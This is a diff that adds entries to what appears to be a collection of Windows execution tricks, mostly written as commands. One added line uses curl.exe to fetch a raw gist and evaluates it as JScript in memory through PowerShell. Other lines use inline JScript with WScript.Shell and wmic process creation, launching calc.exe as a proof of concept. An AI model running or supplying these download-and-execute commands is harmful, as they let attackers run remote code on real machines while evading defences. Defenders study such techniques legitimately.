@@ -98,3 +98,14 @@ uses LoadLibrary to load PrintDialog.dll, so if you copy it to a different folde
 
 ----------------------------------------------------------------------------------------------------------------------------------------
 
+$x02 = curl.exe --basic https://gist.githubusercontent.com/homjxi0e/daa8657aab3fa7535aa0a1146378faf4/raw/46ff2438e4e2bea4910981336efc7e8b66afcaaa/ss.raw;[Reflection.Assembly]::LoadWithPartialName('Microsoft.JSCript');[Microsoft.JScript.Eval]::JScriptEvaluate($x02,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
+
+$Microsoft = echo 'var Windows = new ActiveXObject("WScript.Shell");Windows.Run("calc.exe")';[Reflection.Assembly]::LoadWithPartialName('Microsoft.JSCript');[Microsoft.JScript.Eval]::JScriptEvaluate($Microsoft,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
+
+----------------------------------------------------------------------------------------------------------------------------------------
+
+wmic process call create calc
+wmic path win32_process call create calc
+
+----------------------------------------------------------------------------------------------------------------------------------------
+
